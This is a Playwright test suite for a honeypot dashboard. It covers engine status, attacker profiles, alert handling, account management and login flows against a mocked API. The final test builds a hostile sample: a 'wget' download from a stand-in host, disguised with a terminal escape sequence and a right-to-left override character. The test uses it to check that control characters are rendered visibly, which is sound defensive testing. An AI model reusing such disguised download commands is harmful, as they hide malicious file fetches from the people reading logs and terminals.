import { test, expect } from '@playwright/test'

// The engineering-round surfaces: engines panel, attacker profile, alert
// notes and bulk actions, account management, model-analysis panel, and the
// session selection surviving a background refresh. Everything runs against
// a mocked API, as the other specs do.

const ADMIN = { id: 1, email: 'admin@example.com', role: 'admin', name: 'Admin', totp_enabled: false }

const session = {
  id: 1, session_uuid: 'test-session-1', attacker_ip: '203.0.113.7',
  protocol: 'ssh', status: 'completed', started_at: '2026-01-01T10:00:00Z',
  attack_category: 'exploitation', is_anomalous: false, geo: { country: 'NL', country_name: 'Netherlands' },
  detected_tools: ['wget_curl'], detected_intents: ['persistence'],
  mitre_techniques: [{ id: 'T1059.004', name: 'Unix Shell', source: 'chimera' }], mitre_tactics: ['TA0002'],
  model_source: 'rules', rule_reason: '2 file upload(s); persistence intent',
  command_count: 4, enrichment_status: 'complete',
  enrichment: {
    intent: 'Deploy a cryptominer and keep it running across reboots.',
    objectives: ['download payload', 'persist via cron'],
    sophistication: 'script_kiddie', confidence: 0.82, model: 'wolfram', analysed_at: '2026-01-01T10:05:00Z',
  },
}

const nodes = [
  {
    id: 1, name: 'honeysentinel-debian', protocol: 'multi', ip_address: '0.0.0.0', port: 2222, mode: 'active',
    is_active: true, last_heartbeat: new Date(Date.now() - 20_000).toISOString(), created_at: '2026-01-01T00:00:00Z',
    online: true, heartbeat_age_seconds: 20, version: '1.1.0',
    status: {
      mode: 'active', protocols: ['ssh', 'ftp', 'http', 'https'], protocols_bound: ['ssh', 'ftp', 'http'],
      active_sessions: 2, total_sessions: 1234, blocked_ips: 3, uptime_seconds: 90_000,
      spool_pending: 5, spool_bytes: 120_000, disk: { path: '/app/data', total_bytes: 100_000_000_000, free_bytes: 4_000_000_000 },
    },
  },
  {
    id: 2, name: 'controlled-test-node', protocol: 'multi', ip_address: '0.0.0.0', port: 2222, mode: 'active',
    is_active: true, last_heartbeat: new Date(Date.now() - 7_200_000).toISOString(), created_at: '2026-01-01T00:00:00Z',
    online: false, heartbeat_age_seconds: 7200, version: null, status: null,
  },
]

const attacker = {
  ip: '203.0.113.7', scanner_operator: null, geo: { country: 'NL', country_name: 'Netherlands', city: 'Amsterdam' },
  first_seen: '2026-01-01T09:00:00Z', last_seen: '2026-01-02T10:00:00Z', session_count: 3,
  alert_count: 2, open_alert_count: 1, protocols: { ssh: 2, http: 1 }, categories: { exploitation: 2, reconnaissance: 1 },
  nodes: ['honeysentinel-debian'], tools: [{ name: 'wget_curl', count: 2 }], intents: [{ name: 'persistence', count: 2 }],
  techniques: [{ id: 'T1059.004', name: 'Unix Shell', count: 2 }], credential_attempts: 14,
  top_usernames: [{ username: 'root', count: 9 }, { username: 'admin', count: 5 }], upload_count: 1, diverted: false,
  sessions: [session, { ...session, id: 2, session_uuid: 'test-session-2', protocol: 'http', attack_category: 'reconnaissance' }],
}

const alerts = [
  {
    id: 10, kind: 'session', session_id: 1, attacker_ip: '203.0.113.7', severity: 'high',
    title: 'Exploitation attack from 203.0.113.7', description: 'Rules: 2 file upload(s).', status: 'new',
    assigned_to_id: null, auto_generated: true, mitre_tactics: [], mitre_techniques: [],
    created_at: new Date(Date.now() - 300_000).toISOString(), updated_at: null, notes: null, occurrences: 3,
    last_seen_at: new Date(Date.now() - 60_000).toISOString(),
  },
  {
    id: 11, kind: 'system', session_id: null, attacker_ip: null, severity: 'medium',
    title: 'Engine controlled-test-node stopped reporting', description: 'No heartbeat for 2 hours.', status: 'new',
    assigned_to_id: null, auto_generated: true, mitre_tactics: [], mitre_techniques: [],
    created_at: new Date(Date.now() - 7_000_000).toISOString(), updated_at: null, notes: 'Known: lab node is off.', occurrences: 1,
  },
]

function mockApi(page, { me = ADMIN, handlers = {} } = {}) {
  const calls = []
  return {
    calls,
    route: page.route('**/api/v1/**', async (route) => {
      const req = route.request()
      const url = new URL(req.url())
      calls.push({ method: req.method(), path: url.pathname, body: req.postDataJSON?.() ?? null, search: url.search })
      for (const [matcher, handler] of Object.entries(handlers)) {
        if (new RegExp(matcher).test(`${req.method()} ${url.pathname}`)) return handler(route, url)
      }
      let body = {}
      const p = url.pathname
      if (p.endsWith('/auth/me')) body = me
      else if (p.endsWith('/sessions/')) body = { sessions: [session], total: 1 }
      else if (/\/sessions\/\d+$/.test(p)) body = session
      else if (p.endsWith('/sessions/attacker/203.0.113.7')) body = attacker
      else if (p.endsWith('/nodes/')) body = nodes
      else if (p.endsWith('/honeypot/status')) body = { reachable: true, running: true, protocols: ['ssh'] }
      else if (p.endsWith('/alerts/stats')) body = { new: 2, acknowledged: 0, resolved: 0, by_severity: {} }
      else if (p.endsWith('/alerts/')) body = { alerts, total: alerts.length, page: 1, page_size: 25 }
      else if (p.endsWith('/settings/thresholds')) body = []
      else if (p.endsWith('/settings/system')) {
        body = {
          honeypot_mode: 'active', active_nodes: 2, protocols: ['multi'],
          enrichment: { configured: true, model: 'wolfram' },
          retention: { sessions_days: 365, audit_days: 180 },
          alerting: { dedup_window_minutes: 60, suppress_scanners: true },
        }
      } else if (p.endsWith('/auth/users')) {
        body = [
          { ...ADMIN, is_active: true, is_verified: true, created_at: '2026-01-01T00:00:00Z', last_login: '2026-01-02T00:00:00Z' },
          { id: 2, email: 'analyst@example.com', name: 'Ana', role: 'analyst', is_active: true, is_verified: true, totp_enabled: true, created_at: '2026-01-01T00:00:00Z', last_login: null },
        ]
      } else if (p.endsWith('/dashboard/stats')) {
        body = { total_sessions: 1, sessions_today: 1, active_sessions: 0, high_severity_alerts: 1, attack_distribution: { exploitation: 1 }, sessions_by_hour: {}, top_attacker_ips: [{ ip: '203.0.113.7', country: 'NL', count: 3 }], top_tools_detected: [] }
      } else if (p.endsWith('/live-events')) {
        body = [{ session_id: 1, session_uuid: 'test-session-1', protocol: 'ssh', attacker_ip: '203.0.113.7', geo_country: 'NL', attack_category: 'exploitation', severity: 'high', timestamp: '2026-01-01T10:00:00Z' }]
      }
      await route.fulfill({ json: body })
    }),
  }
}

test.beforeEach(async ({ page }) => {
  await page.addInitScript(() => localStorage.setItem('access_token', 'test-token'))
})

test('the engines panel shows liveness, spool and disk warnings per node', async ({ page }) => {
  await mockApi(page).route
  await page.goto('/settings')
  const cards = page.getByTestId('engine-card')
  await expect(cards).toHaveCount(2)
  const live = cards.filter({ hasText: 'honeysentinel-debian' })
  await expect(live.getByText('Online')).toBeVisible()
  await expect(live.getByText('5 waiting')).toBeVisible()
  await expect(live.getByText('1 not bound')).toBeVisible()
  await expect(live.getByText(/4 GB free · 4%/)).toBeVisible()
  await expect(live.getByText('v1.1.0')).toBeVisible()
  const stale = cards.filter({ hasText: 'controlled-test-node' })
  await expect(stale.getByText('Not reporting')).toBeVisible()
  await expect(stale.getByText(/last seen 2 h ago/)).toBeVisible()
  // The sidebar chip summarises the same thing.
  await expect(page.getByTestId('engines-chip')).toContainText('1/2')
})

test('an address has a profile page reachable from the session list', async ({ page }) => {
  await mockApi(page).route
  await page.goto('/sessions')
  await page.getByRole('link', { name: 'profile' }).first().click()
  await expect(page).toHaveURL(/\/attackers\/203\.0\.113\.7$/)
  await expect(page.getByRole('heading', { name: '203.0.113.7' })).toBeVisible()
  await expect(page.getByText('Netherlands')).toBeVisible()
  await expect(page.getByText('Amsterdam')).toBeVisible()
  await expect(page.getByText('root', { exact: true })).toBeVisible()
  await expect(page.getByText('14 attempts')).toBeVisible()
  await expect(page.getByText('T1059.004')).toBeVisible()
  await page.getByRole('link', { name: /Reconnaissance/ }).click()
  await expect(page).toHaveURL(/\/sessions\?session=2/)
})

test('private addresses are labelled by network on the profile page', async ({ page }) => {
  await mockApi(page, {
    handlers: {
      'GET .*/sessions/attacker/100\\.87\\.82\\.102$': (route) => route.fulfill({
        json: { ...attacker, ip: '100.87.82.102', geo: {}, session_count: 1, sessions: [session] },
      }),
    },
  }).route
  await page.goto('/attackers/100.87.82.102')
  await expect(page.getByText('Tailnet')).toBeVisible()
})

test('the session panel shows the model analysis, the rule reason, and can queue a re-run', async ({ page }) => {
  const api = mockApi(page, {
    handlers: {
      'POST .*/sessions/1/enrich$': (route) => route.fulfill({ status: 202, json: { session_id: 1, enrichment_status: 'pending' } }),
    },
  })
  await api.route
  await page.goto('/sessions?session=1')
  await page.setViewportSize({ width: 1400, height: 900 })
  const block = page.getByTestId('enrichment-block')
  await expect(block).toContainText('Deploy a cryptominer')
  await expect(block).toContainText('persist via cron')
  await expect(block).toContainText('Script kiddie')
  await expect(block).toContainText('82%')
  await expect(page.getByText(/Matched:/)).toContainText('2 file upload(s)')
  await expect(page.getByText('model', { exact: true })).toBeVisible()
  await block.getByRole('button', { name: 'Analyse again' }).click()
  await expect(block).toContainText('Queued')
  expect(api.calls.some((c) => c.method === 'POST' && c.path.endsWith('/sessions/1/enrich'))).toBe(true)
})

test('the session selection survives the background refresh', async ({ page }) => {
  // The selected session lives on another page, as an alert link produces.
  let lists = 0
  await mockApi(page, {
    handlers: {
      'GET .*/sessions/$': (route) => { lists += 1; return route.fulfill({ json: { sessions: [session], total: 1 } }) },
      'GET .*/sessions/99$': (route) => route.fulfill({ json: { ...session, id: 99, session_uuid: 'outside-page' } }),
    },
  }).route
  await page.clock.install()
  await page.goto('/sessions?session=99')
  await expect(page.getByText('outside-page', { exact: true }).last()).toBeVisible()
  const detailRequests = []
  page.on('request', (req) => { if (/\/sessions\/99$/.test(new URL(req.url()).pathname)) detailRequests.push(1) })
  // Two poll ticks.
  await page.clock.runFor(31_000)
  await expect.poll(() => lists).toBeGreaterThanOrEqual(2)
  await expect(page.getByText('outside-page', { exact: true }).last()).toBeVisible()
  expect(detailRequests.length).toBe(0)
})

test('alerts can carry notes, be bulk-acknowledged, and system alerts have no session link', async ({ page }) => {
  const api = mockApi(page, {
    handlers: {
      'PATCH .*/alerts/10$': (route) => route.fulfill({ json: { ...alerts[0], notes: route.request().postDataJSON().notes } }),
      'POST .*/alerts/bulk$': (route) => route.fulfill({ json: { updated: 2 } }),
    },
  })
  await api.route
  await page.goto('/alerts')
  await expect(page.getByText('×3')).toBeVisible()
  await expect(page.getByText('Known: lab node is off.')).toBeVisible()
  const systemRow = page.getByRole('article').filter({ hasText: 'stopped reporting' })
  await expect(systemRow.getByRole('link', { name: /Session/ })).toHaveCount(0)
  await expect(systemRow.getByLabel('System alert')).toBeVisible()
  await expect(page).toHaveTitle(/^\(2\) /)

  const sessionRow = page.getByRole('article').filter({ hasText: 'Exploitation attack' })
  await sessionRow.getByRole('button', { name: 'Add note' }).click()
  await sessionRow.getByLabel('Notes for alert 10').fill('Checked: dropper URL is dead.')
  await sessionRow.getByRole('button', { name: 'Save note' }).click()
  const patch = api.calls.find((c) => c.method === 'PATCH' && c.path.endsWith('/alerts/10'))
  expect(patch.body).toEqual({ notes: 'Checked: dropper URL is dead.' })

  await page.getByRole('button', { name: 'Select open on this page' }).click()
  await expect(page.getByText('2 selected')).toBeVisible()
  await page.getByRole('button', { name: 'Acknowledge selected' }).click()
  const bulk = api.calls.find((c) => c.method === 'POST' && c.path.endsWith('/alerts/bulk'))
  expect(bulk.body).toEqual({ ids: [10, 11], status: 'acknowledged' })

  await page.getByLabel('Kind').selectOption('system')
  await expect.poll(() => api.calls.filter((c) => c.path.endsWith('/alerts/') && c.search.includes('kind=system')).length).toBeGreaterThan(0)
})

test('administrators manage accounts from Settings', async ({ page }) => {
  const api = mockApi(page, {
    handlers: {
      'POST .*/auth/users$': (route) => route.fulfill({ status: 201, json: { id: 3, ...route.request().postDataJSON(), is_active: true } }),
      'PATCH .*/auth/users/2/role$': (route) => route.fulfill({ json: {} }),
      'PATCH .*/auth/users/2$': (route) => route.fulfill({ json: {} }),
      'POST .*/auth/users/2/reset-mfa$': (route) => route.fulfill({ json: {} }),
      'POST .*/auth/users/2/reset-password$': (route) => route.fulfill({ json: {} }),
      'POST .*/auth/change-password$': (route) => route.fulfill({ json: { changed: true } }),
    },
  })
  await api.route
  page.on('dialog', (d) => d.accept())
  await page.goto('/settings')
  await expect(page.getByTestId('user-row')).toHaveCount(2)

  await page.getByRole('button', { name: 'New account' }).click()
  await page.getByPlaceholder('analyst@soc.internal').fill('new@example.com')
  await page.getByRole('button', { name: 'Create account' }).click()
  await expect(page.getByRole('status')).toContainText('Account created for new@example.com')
  const created = api.calls.find((c) => c.method === 'POST' && c.path.endsWith('/auth/users'))
  expect(created.body.email).toBe('new@example.com')
  expect(created.body.password.length).toBeGreaterThanOrEqual(12)

  const analyst = page.getByTestId('user-row').filter({ hasText: 'analyst@example.com' })
  await analyst.getByLabel('Role for analyst@example.com').selectOption('viewer')
  await expect.poll(() => api.calls.some((c) => c.method === 'PATCH' && c.path.endsWith('/auth/users/2/role') && c.body.role === 'viewer')).toBe(true)
  await analyst.getByRole('button', { name: 'Reset MFA' }).click()
  await expect.poll(() => api.calls.some((c) => c.path.endsWith('/auth/users/2/reset-mfa'))).toBe(true)
  await analyst.getByRole('button', { name: 'Reset password' }).click()
  await expect(analyst.getByText(/Temporary password for analyst@example.com/)).toBeVisible()
  await analyst.getByRole('button', { name: 'Deactivate' }).click()
  await expect.poll(() => api.calls.some((c) => c.method === 'PATCH' && c.path.endsWith('/auth/users/2') && c.body.is_active === false)).toBe(true)

  // Everyone gets to change their own password.
  await page.getByLabel('Current password').fill('old-password-123')
  await page.getByLabel('New password', { exact: true }).fill('a-much-longer-password')
  await page.getByLabel('Repeat new password').fill('a-much-longer-password')
  await page.getByRole('button', { name: 'Change password' }).click()
  await expect(page.getByText('Password changed.')).toBeVisible()
})

test('viewers do not see account management', async ({ page }) => {
  await mockApi(page, { me: { id: 5, email: 'viewer@example.com', role: 'viewer' } }).route
  await page.goto('/settings')
  await expect(page.getByTestId('engine-card').first()).toBeVisible()
  await expect(page.getByText('Accounts', { exact: true })).toHaveCount(0)
})

test('signing in returns to the page that was asked for', async ({ page }) => {
  await page.addInitScript(() => localStorage.removeItem('access_token'))
  let authed = false
  await page.route('**/api/v1/**', async (route) => {
    const url = new URL(route.request().url())
    if (url.pathname.endsWith('/auth/login')) {
      authed = true
      return route.fulfill({ json: { access_token: 'a', refresh_token: 'r', token_type: 'bearer' } })
    }
    if (url.pathname.endsWith('/auth/me')) {
      return authed ? route.fulfill({ json: ADMIN }) : route.fulfill({ status: 401, json: { detail: 'no' } })
    }
    if (url.pathname.endsWith('/alerts/')) return route.fulfill({ json: { alerts: [], total: 0 } })
    if (url.pathname.endsWith('/alerts/stats')) return route.fulfill({ json: { new: 0 } })
    return route.fulfill({ json: Array.isArray([]) && url.pathname.endsWith('/nodes/') ? [] : {} })
  })
  await page.goto('/alerts?status=resolved')
  await expect(page).toHaveURL(/\/login\?next=%2Falerts%3Fstatus%3Dresolved/)
  await expect(page.getByLabel('Email')).toBeVisible()
  await page.getByLabel('Email').fill('admin@example.com')
  await page.getByLabel('Password', { exact: true }).fill('correct horse battery')
  await page.getByRole('button', { name: 'Sign in' }).click()
  await expect(page).toHaveURL(/\/alerts\?status=resolved$/)
})

test('a transient failure to load the account does not sign the user out', async ({ page }) => {
  await page.route('**/api/v1/**', async (route) => {
    const url = new URL(route.request().url())
    if (url.pathname.endsWith('/auth/me')) return route.abort('connectionrefused')
    return route.fulfill({ json: {} })
  })
  await page.goto('/')
  await expect(page).toHaveURL(/\/login/)
  expect(await page.evaluate(() => localStorage.getItem('access_token'))).toBe('test-token')
})

test('control characters in attacker strings are rendered as a visible marker', async ({ page }) => {
  const ESC = String.fromCharCode(27)
  const hostile = { ...session, attacker_ip: '203.0.113.7', command_summary: `wget ${ESC}[2Khidden http://x/${String.fromCodePoint(0x202e)}hs.exe` }
  await mockApi(page, {
    handlers: {
      'GET .*/sessions/$': (route) => route.fulfill({ json: { sessions: [hostile], total: 1 } }),
      'GET .*/sessions/1$': (route) => route.fulfill({ json: hostile }),
    },
  }).route
  await page.setViewportSize({ width: 1400, height: 900 })
  await page.goto('/sessions?session=1')
  const marker = String.fromCodePoint(0x2370)
  await expect(page.getByText(`wget ${marker}hidden http://x/${marker}hs.exe`)).toBeVisible()
})
